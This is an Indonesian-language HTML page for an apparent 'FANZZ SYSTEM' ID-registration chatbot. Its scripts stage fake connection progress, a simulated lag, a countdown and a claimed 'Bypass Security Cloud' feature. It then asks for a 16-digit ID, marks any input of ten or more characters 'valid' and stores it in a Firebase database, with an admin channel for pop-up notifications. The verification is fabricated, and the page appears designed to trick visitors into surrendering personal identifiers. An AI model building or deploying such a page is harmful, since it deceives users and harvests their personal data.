<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fanzz</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; outline: none; }
        body, html { height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #0b0d0f; color: white; overflow: hidden; }

        /* iOS NOTIFICATION STYLE */
        #ios-notification {
            position: fixed;
            top: -120px; /* Sembunyi di atas */
            left: 50%;
            transform: translateX(-50%);
            width: 92%;
            max-width: 400px;
            background: rgba(45, 47, 49, 0.85);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 24px;
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 10000;
            transition: all 0.6s cubic-bezier(0.19, 1, 0.22, 1);
            border: 0.5px solid rgba(255,255,255,0.1);
        }
        #ios-notification.show { top: 20px; }
        .notif-icon { width: 38px; height: 38px; border-radius: 10px; object-fit: cover; }
        .notif-content { flex: 1; }
        .notif-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
        .notif-title { font-weight: 700; font-size: 13px; color: #0084ff; }
        .notif-time { font-size: 11px; color: rgba(255,255,255,0.5); }
        .notif-msg { font-size: 13px; color: #fff; line-height: 1.3; }

        /* LAYOUT LAINNYA */
        .btn-click { transition: all 0.2s ease; cursor: pointer; }
        .btn-click:active { transform: scale(0.92); background: #0084ff !important; }
        .boot-logo { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #0084ff; margin-bottom: 20px; object-fit: cover; }
        
        #boot-screen, #loading-screen, #input-room, #maintenance-screen { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #0b0d0f; display: flex; flex-direction: column; 
            justify-content: center; align-items: center; z-index: 9999; text-align: center; padding: 25px; 
        }
        #loading-screen, #input-room, #maintenance-screen { display: none; }

        .progress-container { width: 100%; max-width: 250px; background: #1a1c1e; height: 10px; border-radius: 10px; margin-top: 20px; overflow: hidden; border: 1px solid #333; }
        .progress-fill { background: #0084ff; height: 100%; width: 0%; transition: width 0.5s linear; }

        #app-container { display: flex; flex-direction: column; height: 100vh; }
        header { background: #1f2123; padding: 15px; text-align: center; border-bottom: 1px solid #333; color: #0084ff; font-weight: bold; display: flex; align-items: center; justify-content: center; }
        .header-logo { width: 30px; height: 30px; border-radius: 50%; margin-right: 10px; object-fit: cover; border: 1px solid #0084ff; }
        
        #chat-window { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; background: #0b0d0f; }
        .msg { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 13px; line-height: 1.5; animation: fadeIn 0.3s ease; }
        .bot { align-self: flex-start; background: #2d2f31; border-bottom-left-radius: 4px; }
        .user { align-self: flex-end; background: #0084ff; border-bottom-right-radius: 4px; }

        .menu-item { background: #1f2123; border: 1px solid #0084ff; color: #0084ff; padding: 12px; border-radius: 12px; margin-top: 10px; text-align: center; font-weight: bold; width: 100%; display: block; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .dots::after { content: '.'; animation: dots 1.5s infinite; }
        @keyframes dots { 0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; } }
    </style>
</head>
<body>

<div id="ios-notification">
    <img src="https://i.ibb.co/spCQpGn4/ic-launchem.png" class="notif-icon">
    <div class="notif-content">
        <div class="notif-header">
            <span class="notif-title">FANZZ SYSTEM</span>
            <span class="notif-time">sekarang</span>
        </div>
        <div class="notif-msg" id="notif-msg-text">Pesan baru diterima.</div>
    </div>
</div>

<div id="boot-screen">
    <img src="https://i.ibb.co/spCQpGn4/ic-launchem.png" class="boot-logo">
    <h2 style="color: #0084ff;">FANZZ SYSTEM</h2>
</div>

<div id="maintenance-screen">
    <i class="fas fa-tools" style="font-size: 4rem; color: #ff4444; margin-bottom: 20px;"></i>
    <h2 style="color: #ff4444;">SERVER MAINTENANCE</h2>
    <p style="color: #888; margin-top: 10px;">Maaf, sistem sedang dalam tahap perbaikan oleh developer.<br>Silakan tunggu beberapa saat lagi.
</div>

<div id="loading-screen">
    <img src="https://i.ibb.co/spCQpGn4/ic-launchem.png" class="boot-logo" style="width: 80px; height: 80px;">
    <h3>LODING<span class="dots"></span></h3>
    <div class="progress-container"><div class="progress-fill" id="fill"></div></div>
    <p id="timer" style="color:#0084ff; font-weight:bold; margin-top:15px; font-size: 1.8rem;">0:00</p>
</div>

<div id="input-room">
    <img src="https://i.ibb.co/spCQpGn4/ic-launchem.png" class="boot-logo" style="width: 70px; height: 70px;">
    <h3 style="color:#0084ff; margin-bottom:20px;">VERIFIKASI ID</h3>
    <input type="text" id="id-field" placeholder="Ketik ID 16 Digit" style="width:100%; max-width:300px; padding:15px; border-radius:12px; background:#1f2123; border:1px solid #333; color:white; text-align:center; margin-bottom:15px;">
    <button onclick="checkIDProcess()" class="btn-click" style="width:100%; max-width:300px; padding:15px; border-radius:12px; background:#0084ff; border:none; color:white; font-weight:bold;">VERIFIKASI SEKARANG</button>
</div>

<div id="app-container">
    <header><img src="https://i.ibb.co/spCQpGn4/ic-launchem.png" class="header-logo"> FANZZ OFFICIAL</header>
    <div id="chat-window"></div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
    import { getDatabase, ref, set, push, onValue } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js";

    // Konfigurasi Firebase (Gunakan milikmu)
    const firebaseConfig = {
        apiKey: "AIzaSyD8vonItkLL1pHklBGidV9j0jUIjZlhukQ",
        authDomain: "bot-admin-9ebdd.firebaseapp.com",
        databaseURL: "https://bot-admin-9ebdd-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "bot-admin-9ebdd",
        storageBucket: "bot-admin-9ebdd.firebasestorage.app",
        messagingSenderId: "462975708084",
        appId: "1:462975708084:web:c1740f5436927fa867e0e1"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const chatWin = document.getElementById('chat-window');

    // --- FUNGSI TAMPIL NOTIF IOS ---
    function showIOSNotif(text) {
        const notif = document.getElementById('ios-notification');
        const msg = document.getElementById('notif-msg-text');
        msg.innerText = text;
        notif.classList.add('show');
        
        // Sembunyikan otomatis setelah 5 detik
        setTimeout(() => {
            notif.classList.remove('show');
        }, 5000);
    }

    // LISTENER NOTIFIKASI DARI ADMIN
    onValue(ref(db, 'settings/notification'), (snapshot) => {
        const msg = snapshot.val();
        if(msg) {
            showIOSNotif(msg);
        }
    });

    // LISTENER STATUS SERVER
    onValue(ref(db, 'settings/serverStatus'), (snapshot) => {
        const status = snapshot.val();
        document.getElementById('maintenance-screen').style.display = (status === "OFF") ? 'flex' : 'none';
    });

    window.onload = () => {
        setTimeout(() => {
            document.getElementById('boot-screen').style.display = 'none';
            sendBot("Halo Boss! Selamat datang di sistem pendaftaran ID. <div class='menu-item btn-click' onclick='startDaftar()'>üìë DAFTAR ID BARU</div>");
        }, 1500);
    };

    function sendUser(t) {
        const d = document.createElement('div'); d.className = 'msg user'; d.innerHTML = t;
        chatWin.appendChild(d); chatWin.scrollTop = chatWin.scrollHeight;
    }

    function sendBot(t, delay = 1000) {
        const d = document.createElement('div'); d.className = 'msg bot'; d.innerHTML = "Mengetik<span class='dots'></span>";
        chatWin.appendChild(d); chatWin.scrollTop = chatWin.scrollHeight;
        setTimeout(() => { d.innerHTML = t; chatWin.scrollTop = chatWin.scrollHeight; }, delay);
        return d;
    }

    window.startDaftar = function() {
        sendUser("Saya ingin Daftar ID Baru Min");
        setTimeout(() => {
            const b = sendBot("Menyiapkan data sistem...<span class='dots'></span>", 1500);
            setTimeout(() => {
                b.innerHTML = `<b>SISTEM SIAP:</b><br>‚Ä¢ Bypass Security Cloud<br>‚Ä¢ Anti-Lag Connection<br><div class='menu-item btn-click' style='background:#00ff88; color:black; border:none;' onclick='prosesKeRuangan2()'>DAFTAR</div>`;
            }, 2000);
        }, 800);
    }

    window.prosesKeRuangan2 = function() {
        sendUser("Daftar Min");
        setTimeout(() => {
            const b = sendBot("Menyiapkan Data... (0%)", 1500);
            setTimeout(() => {
                let p = 0;
                const inv = setInterval(() => {
                    p += 10;
                    if(p === 40) b.innerHTML = "<span style='color:#ff4444'>‚ö†Ô∏è Jaringan Lag... Reconnecting...</span>";
                    else if(p === 60) b.innerHTML = "Stabil. Sinkronisasi... (60%)";
                    else b.innerHTML = `Menghubungkan ke Server... (${p}%)`;
                    
                    if(p >= 100) {
                        clearInterval(inv);
                        b.innerHTML = "‚úÖ Masuk server...";
                        setTimeout(() => { 
                            document.getElementById('loading-screen').style.display = 'flex';
                            startTimer();
                        }, 1200);
                    }
                }, 1000);
            }, 2000);
        }, 1000);
    }

    function startTimer() {
        let cur = 0, tot = 10;
        const inv = setInterval(() => {
            cur++;
            document.getElementById('fill').style.width = (cur/tot)*100 + "%";
            let m = Math.floor((tot-cur)/60), s = (tot-cur)%60;
            document.getElementById('timer').innerText = `${m}:${s<10?'0'+s:s}`;
            if(cur >= tot) {
                clearInterval(inv);
                document.getElementById('loading-screen').style.display = 'none';
                document.getElementById('input-room').style.display = 'flex';
            }
        }, 1000);
    }

    window.checkIDProcess = function() {
        const id = document.getElementById('id-field').value.trim();
        if(!id) return;
        document.getElementById('input-room').style.display = 'none';
        sendUser("Verifikasi ID: " + id);
        const b = sendBot("Mengecek database master...<span class='dots'></span>", 2500);
        
        setTimeout(() => {
            if(id.length >= 10) {
                b.innerHTML = "‚úÖ <b>ID VALID!</b> Daftar Sukses.";
                push(ref(db, 'users_id/'), { id: id, time: new Date().toLocaleString() });
            } else {
                b.innerHTML = "‚ùå <b>ID GAGAL!</b>.";
            }
        }, 4000);
    }
</script>
</body>
</html>
